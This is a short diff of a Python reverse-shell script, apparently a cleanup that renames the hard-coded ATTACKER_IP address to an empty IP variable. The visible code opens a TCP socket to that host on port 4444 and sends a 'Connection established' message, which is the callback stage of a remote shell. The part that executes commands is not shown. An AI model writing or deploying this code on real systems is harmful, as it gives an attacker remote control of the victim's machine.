@@ -3,14 +3,14 @@ import socket #import socket module for network communication
 import subprocess #import os module for executing shell commands
 import time #import time module for adding delays
 
-ATTACKER_IP = "172.26.233.12"
+IP = ""
 PORT = 4444
 
 def start_shell():
     try:
         # 1. Setup socket connection
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ATTACKER_IP, PORT))
+        s.connect((IP, PORT))
 
         # 2. Send connection confirmation (Optional)
         s.sendall(b"Connection established.\n")
